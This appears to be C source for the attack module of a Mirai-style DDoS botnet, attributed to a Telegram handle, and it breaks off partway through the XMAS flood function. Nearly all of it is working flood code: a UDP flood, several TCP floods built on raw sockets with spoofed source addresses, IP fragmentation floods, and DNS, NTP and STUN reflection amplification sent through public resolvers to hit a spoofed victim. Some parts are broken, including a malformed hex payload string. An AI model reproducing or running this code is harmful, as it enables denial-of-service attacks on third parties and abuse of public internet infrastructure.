#define _GNU_SOURCE

// by juan @ipmiv2 on telegram

#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <errno.h>
#include <string.h>
#include <sys/select.h>
#include <linux/tcp.h>
#include <fcntl.h>
#include <linux/icmp.h>
#include <linux/udp.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <netdb.h>

#include "headers/config.h"
#include "headers/attack.h"
#include "headers/protocol.h"
#include "headers/util.h"
#include "headers/rand.h"
#include "headers/process.h"

#ifndef TH_FIN
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#define TCP_OPT_NOP 1
#define TCP_OPT_MSS 2
#define TCP_OPT_WS 3
#define TCP_OPT_SACK 4
#define TCP_OPT_TIMESTAMP 8
#define TCPOPT_EOL 0x00
#endif

static ipv4_t get_dns_resolver(void);

enum XMAS_PROFILE
{
    PROFILE_XMAS,
    PROFILE_NULL,
    PROFILE_FIN
};

#define MAX_THREADS 100

static unsigned long int Q[4096], c = 362436;

char *hexPayload = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A";

char random_hex() {
    char hexs[] = {'\x0', '\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07', '\x08', '\x09', '\x0a', '\x0b', '\x0c', '\x0d', '\x0e', '\x0f', '\x10', '\x11', '\x12', '\x13', '\x14', '\x15', '\x16', '\x17', '\x18', '\x19', '\x1a', '\x1b', '\x1c', '\x1d', '\x1e', '\x1f', '\x20', '\x21', '\x22', '\x23', '\x24', '\x25', '\x26', '\x27', '\x28', '\x29', '\x2a', '\x2b', '\x2c', '\x2d', '\x2e', '\x2f', '\x30', '\x31', '\x32', '\x33', '\x34', '\x35', '\x36', '\x37', '\x38', '\x39', '\x3a', '\x3b', '\x3c', '\x3d', '\x3e', '\x3f', '\x40', '\x41', '\x42', '\x43', '\x44', '\x45', '\x46', '\x47', '\x48', '\x49', '\x4a', '\x4b', '\x4c', '\x4d', '\x4e', '\x4f', '\x50', '\x51', '\x52', '\x53', '\x54', '\x55', '\x56', '\x57', '\x58', '\x59', '\x5a', '\x5b', '\x5c', '\x5d', '\x5e', '\x5f', '\x60', '\x61', '\x62', '\x63', '\x64', '\x65', '\x66', '\x67', '\x68', '\x69', '\x6a', '\x6b', '\x6c', '\x6d', '\x6e', '\x6f', '\x70', '\x71', '\x72', '\x73', '\x74', '\x75', '\x76', '\x77', '\x78', '\x79', '\x7a', '\x7b', '\x7c', '\x7d', '\x7e', '\x7f', '\x80', '\x81', '\x82', '\x83', '\x84', '\x85', '\x86', '\x87', '\x88', '\x89', '\x8a', '\x8b', '\x8c', '\x8d', '\x8e', '\x8f', '\x90', '\x91', '\x92', '\x93', '\x94', '\x95', '\x96', '\x97', '\x98', '\x99', '\x9a', '\x9b', '\x9c', '\x9d', '\x9e', '\x9f', '\xa0', '\xa1', '\xa2', '\xa3', '\xa4', '\xa5', '\xa6', '\xa7', '\xa8', '\xa9', '\xaa', '\xab', '\xac', '\xad', '\xae', '\xaf', '\xb0', '\xb1', '\xb2', '\xb3', '\xb4', '\xb5', '\xb6', '\xb7', '\xb8', '\xb9', '\xba', '\xbb', '\xbc', '\xbd', '\xbe', '\xbf', '\xc0', '\xc1', '\xc2', '\xc3', '\xc4', '\xc5', '\xc6', '\xc7', '\xc8', '\xc9', '\xca', '\xcb', '\xcc', '\xcd', '\xce', '\xcf', '\xd0', '\xd1', '\xd2', '\xd3', '\xd4', '\xd5', '\xd6', '\xd7', '\xd8', '\xd9', '\xda', '\xdb', '\xdc', '\xdd', '\xde', '\xdf', '\xe0', '\xe1', '\xe2', '\xe3', '\xe4', '\xe5', '\xe6', '\xe7', '\xe8', '\xe9', '\xea', '\xeb', '\xec', '\xed', '\xee', '\xef', '\xf0', '\xf1', '\xf2', '\xf3', '\xf4', '\xf5', '\xf6', '\xf7', '\xf8', '\xf9', '\xfa', '\xfb', '\xfc', '\xfd', '\xfe', '\xff'};

    int length = sizeof(hexs) / sizeof(hexs[0]);

    return rand() % (length + 1);
}

void init_rand(unsigned long int x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}

unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1; // include max_num in output
    } else {
        low_num = max_num + 1; // include max_num in output
        hi_num = min_num;
    }

    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}

unsigned short csum (unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (unsigned short)(~sum);
}

struct thread_data {
    int thread_id;
    int socket_fd;
    struct sockaddr_in target_addr;
    uint16_t data_len;
    BOOL data_rand;
};



ipv4_t LOCAL_ADDR = 0xC0A80001;

static void watch_time(int seconds) {
    if (fork() != 0)
        return;
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    sleep(seconds);
    kill(getppid(), SIGKILL);
    exit(0);
}

void attack_udp_rand(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};

    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = calloc(65535, sizeof (char));

        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
        }

        // For prefix attacks
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
        }
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];

            // Randomize packet content?
            if (data_rand)
                rand_str(data, data_len);

#ifdef DEBUG
            errno = 0;
            if (send(fds[i], data, data_len, MSG_NOSIGNAL) == -1)
            {
                printf("send failed: %d\n", errno);
            } else {
                printf(".\n");
            }
#else
            send(fds[i], data, data_len, MSG_NOSIGNAL);
#endif
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}

void attack_udp_mixamp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 255);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0);
    char *amp_type_str = attack_get_opt_str(opts_len, opts, ATK_OPT_CUSTOM, "random");
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, 0xffffffff);

    const ipv4_t DNS_AMPLIFIERS[] = {
        INET_ADDR(8,8,8,8),
        INET_ADDR(1,1,1,1),
        INET_ADDR(9,9,9,9)
    };
    const ipv4_t NTP_AMPLIFIERS[] = {
        INET_ADDR(216,239,35,0),
        INET_ADDR(162,159,200,1),
        INET_ADDR(129,250,35,250)
    };
    const ipv4_t STUN_AMPLIFIERS[] = {
        INET_ADDR(64,233,161,127),
        INET_ADDR(142,250,31,127),
        INET_ADDR(172,217,3,110)
    };

    #define DNS_PAYLOAD_LEN 29
    static char dns_payload[DNS_PAYLOAD_LEN] = {
        0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x03, 'i', 's', 'c', 0x03, 'o', 'r', 'g', 0x00, 0x00, 0xff, 0x00, 0x01
    };
    #define NTP_PAYLOAD_LEN 48
    static char ntp_payload[NTP_PAYLOAD_LEN] = {
        0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    #define STUN_PAYLOAD_LEN 20
    static char stun_payload[STUN_PAYLOAD_LEN] = {
        0x00, 0x01, 0x00, 0x00, 0x21, 0x12, 0xa4, 0x42, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00
    };

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {
#ifdef DEBUG
        printf("Failed to create raw socket: %s\n", strerror(errno));
#endif
        return;
    }

    int hincl = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

    for (i = 0; i < targs_len; i++) {
        pkts[i] = calloc(1, sizeof(struct iphdr) + sizeof(struct udphdr) + 1024);
        if (pkts[i] == NULL)
            goto cleanup;
    }

    static int dns_amp_idx = 0, ntp_amp_idx = 0, stun_amp_idx = 0;
    int amp_type = 0;

    if (strcmp(amp_type_str, "dns") == 0) amp_type = 1;
    else if (strcmp(amp_type_str, "ntp") == 0) amp_type = 2;
    else if (strcmp(amp_type_str, "stun") == 0) amp_type = 3;

    while (TRUE) {
        for (i = 0; i < targs_len; i++) {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            char *data = (char *)(udph + 1);
            ipv4_t amp_ip = 0;
            port_t dest_port;
            const char *payload;
            uint16_t payload_len;

            int prot = amp_type;
            if (prot == 0) prot = (rand_next() % 3) + 1;

            switch (prot) {
                case 1:
                    amp_ip = DNS_AMPLIFIERS[dns_amp_idx++ % (sizeof(DNS_AMPLIFIERS)/sizeof(ipv4_t))];
                    dest_port = (dport == 0) ? 53 : dport;
                    payload = dns_payload;
                    payload_len = DNS_PAYLOAD_LEN;
                    break;
                case 2:
                    amp_ip = NTP_AMPLIFIERS[ntp_amp_idx++ % (sizeof(NTP_AMPLIFIERS)/sizeof(ipv4_t))];
                    dest_port = (dport == 0) ? 123 : dport;
                    payload = ntp_payload;
                    payload_len = NTP_PAYLOAD_LEN;
                    break;
                case 3:
                    amp_ip = STUN_AMPLIFIERS[stun_amp_idx++ % (sizeof(STUN_AMPLIFIERS)/sizeof(ipv4_t))];
                    dest_port = (dport == 0) ? 3478 : dport;
                    payload = stun_payload;
                    payload_len = STUN_PAYLOAD_LEN;
                    break;
                default:
                    continue;
            }

            uint16_t tx_id = rand_next() & 0xFFFF;
            if (prot == 1) {
                memcpy(data, payload, payload_len);
                *((uint16_t*)data) = tx_id;
            } else {
                memcpy(data, payload, payload_len);
            }

            uint32_t victim_ip = targs[i].addr;
            if (targs[i].netmask < 32) {
                victim_ip = htonl(ntohl(targs[i].addr) + (rand_next() % (1 << (32 - targs[i].netmask))));
            }

            iph->version = 4;
            iph->ihl = 5;
            iph->tos = ip_tos;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len);
            iph->id = htons(ip_ident);
            iph->ttl = ip_ttl;
            iph->protocol = IPPROTO_UDP;
            iph->saddr = victim_ip;
            iph->daddr = amp_ip;
            if (dont_frag) iph->frag_off = htons(1 << 14);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            udph->source = htons(rand_next() % 65535);
            udph->dest = htons(dest_port);
            udph->len = htons(sizeof(struct udphdr) + payload_len);
            udph->check = 0;
            udph->check = checksum_tcp_udp(iph, udph, ntohs(udph->len), ntohs(udph->len));

            struct sockaddr_in dest_addr = {0};
            dest_addr.sin_family = AF_INET;
            dest_addr.sin_addr.s_addr = amp_ip;
            sendto(fd, pkts[i], ntohs(iph->tot_len), 0, 
                    (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        }
    }
cleanup:
    if (fd != -1) close(fd);
    if (pkts) {
        for (i = 0; i < targs_len; i++)
            if (pkts[i]) free(pkts[i]);
        free(pkts);
    }
}

void attack_tcp_boom(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket");
#endif
        return;
    }

    int hincl = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        pkts[i] = calloc(1, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        struct iphdr *iph = (struct iphdr *)pkts[i];
        struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
        char *payload = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);

        tcph->source = htons(sport == 0xffff ? rand_next() & 0xffff : sport);
        tcph->dest = htons(dport == 0xffff ? rand_next() & 0xffff : dport);
        tcph->seq = htonl(rand_next());
        tcph->ack_seq = htonl(rand_next());
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->ack = 1;
        tcph->window = htons(2048 + (rand_next() % 4096));

        uint8_t *tcp_options = (uint8_t *)(tcph + 1);
        tcp_options[0] = 0x02;
        tcp_options[1] = 0x04;
        *(uint16_t *)&tcp_options[2] = htons(1460);
        tcp_options[4] = 0x01;
        tcp_options[5] = 0x03;
        tcp_options[6] = 0x03;
        tcp_options[7] = 0x06;
        tcp_options[8] = 0x01;
        tcp_options[9] = 0x01;
        tcp_options[10] = 0x08;
        tcp_options[11] = 0x0a;
        *(uint32_t *)&tcp_options[12] = htonl(rand_next());
        *(uint32_t *)&tcp_options[16] = 0;

        if (data_rand && data_len > 0)
        {
            rand_str(payload, data_len);
        }
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            if (targs[i].netmask < 32)
            {
                iph->daddr = htonl(ntohl(targs[i].addr) + (rand_next() >> targs[i].netmask));
            }

            if (source_ip == 0xffffffff)
            {
                iph->saddr = rand_next();
            }

            if (sport == 0xffff)
            {
                tcph->source = htons(1024 + (rand_next() % 64512));
            }
            if (dport == 0xffff)
            {
                tcph->dest = htons(rand_next() % 65535);
            }

            tcph->seq = htonl(rand_next());
            tcph->ack_seq = htonl(rand_next());

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            tcph->check = 0;
            tcph->check = checksum_tcp_udp(iph, tcph, sizeof(struct tcphdr) + data_len, sizeof(struct tcphdr));

            int ttl = 32 + (rand_next() % 32);
            setsockopt(fd, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));

            sendto(fd, pkts[i], sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
        usleep(10);
    }

    close(fd);
    for (i = 0; i < targs_len; i++)
        free(pkts[i]);
    free(pkts);
}

void attack_tcp_killer(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket");
#endif
        return;
    }

    int hincl = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        pkts[i] = calloc(1, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        struct iphdr *iph = (struct iphdr *)pkts[i];
        struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
        char *payload = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        iph->id = htons(rand_next() & 0xffff);
        iph->ttl = 32 + (rand_next() % 96);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);

        tcph->source = htons(sport == 0xffff ? rand_next() & 0xffff : sport);
        tcph->dest = htons(dport == 0xffff ? rand_next() & 0xffff : dport);
        tcph->seq = htonl(rand_next());
        tcph->ack_seq = htonl(rand_next());
        tcph->doff = 5;
        uint8_t flags[] = {TH_SYN, TH_ACK, TH_FIN, TH_PUSH, TH_URG};
        uint8_t selected = flags[rand_next() % (sizeof(flags) / sizeof(flags[0]))];
        *((uint8_t *)tcph + 13) = selected;
        tcph->window = htons(256 + (rand_next() % 8192));

        if (data_rand && data_len > 0)
        {
            for (int j = 0; j < data_len; j++)
            {
                payload[j] = (rand_next() % 2 == 0) ? 0x90 : (rand_next() & 0xff);
            }
        }
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

            if (targs[i].netmask < 32)
            {
                iph->daddr = htonl(ntohl(targs[i].addr) + (rand_next() >> targs[i].netmask));
            }

            if (source_ip == 0xffffffff)
            {
                iph->saddr = rand_next();
            }

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            tcph->check = 0;
            tcph->check = checksum_tcp_udp(iph, tcph, sizeof(struct tcphdr) + data_len, sizeof(struct tcphdr));

            sendto(fd, pkts[i], sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }

    close(fd);
    for (i = 0; i < targs_len; i++)
        free(pkts[i]);
    free(pkts);
}

void attack_tcp_frag(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    int frag_size = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_FRAG_SIZE, 32);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
        return;

    int hincl = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(int));

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int total_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len;
            char *packet = calloc(1, total_len);
            struct iphdr *iph = (struct iphdr *)packet;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *payload = (char *)(tcph + 1);

            iph->version = 4;
            iph->ihl = 5;
            iph->tos = ip_tos;
            iph->tot_len = htons(total_len);
            iph->id = htons(ip_ident == 0xffff ? rand_next() & 0xffff : ip_ident);
            iph->ttl = ip_ttl;
            iph->protocol = IPPROTO_TCP;
            iph->saddr = source_ip == 0xffffffff ? rand_next() : source_ip;
            iph->daddr = targs[i].addr;
            if (dont_frag)
                iph->frag_off = htons(1 << 14);

            tcph->source = htons(sport == 0xffff ? rand_next() & 0xffff : sport);
            tcph->dest = htons(dport == 0xffff ? rand_next() & 0xffff : dport);
            tcph->seq = htonl(rand_next());
            tcph->ack_seq = htonl(rand_next());
            tcph->doff = 5;

            uint8_t flags[] = {TH_SYN, TH_ACK, TH_FIN, TH_PUSH, TH_URG};
            uint8_t selected = flags[rand_next() % (sizeof(flags) / sizeof(flags[0]))];
            *((uint8_t *)tcph + 13) = selected;
            tcph->window = htons(256 + (rand_next() % 8192));

            if (data_rand && data_len > 0)
            {
                for (int j = 0; j < data_len; j++)
                    payload[j] = (rand_next() % 2 == 0) ? 0x90 : (rand_next() & 0xff);
            }

            int offset = 0;
            while (offset < total_len - sizeof(struct iphdr))
            {
                int remaining = total_len - sizeof(struct iphdr) - offset;
                int frag_payload_size = remaining > frag_size ? frag_size : remaining;
                int frag_total_size = sizeof(struct iphdr) + frag_payload_size;

                char *frag_pkt = calloc(1, frag_total_size);
                struct iphdr *frag_iph = (struct iphdr *)frag_pkt;

                memcpy(frag_pkt, packet, sizeof(struct iphdr));
                memcpy(frag_pkt + sizeof(struct iphdr), packet + sizeof(struct iphdr) + offset, frag_payload_size);

                frag_iph->tot_len = htons(frag_total_size);

                uint16_t frag_off = (offset / 8);
                if ((offset + frag_payload_size) < (total_len - sizeof(struct iphdr)))
                    frag_off |= htons(1 << 13);

                frag_iph->frag_off = frag_off;

                frag_iph->check = 0;
                frag_iph->check = checksum_generic((uint16_t *)frag_iph, sizeof(struct iphdr));

                sendto(fd, frag_pkt, frag_total_size, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));

                free(frag_pkt);
                offset += frag_payload_size;
            }

            free(packet);
        }
    }

    close(fd);
}

void attack_tcp_xmas(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd, hincl = 1;
    struct attack_xmas_data *xmas_data = calloc(targs_len, sizeof(struct attack_xmas_data));
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint8_t profile = attack_get_opt_int(opts_len, opts, ATK_OPT_CUSTOM + 1, PROFILE_XMAS);

    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
        return;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(int)) == -1)
    { close(rfd); return; }

    for (i = 0; i < targs_len; i++)
    {
        int fd;
        struct sockaddr_in addr = {0};
        struct sockaddr_in recv_addr = {0};
        socklen_t recv_len = sizeof(recv_addr);
        char pktbuf[2048] = {0};
        struct timeval timeo;
        fd_set fdset;

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = targs[i].addr;
        addr.sin_port = htons(dport == 0xffff ? rand_next() & 0xffff : dport);

        if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
            continue;
        fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
        connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

        FD_ZERO(&fdset);
        FD_SET(fd, &fdset);
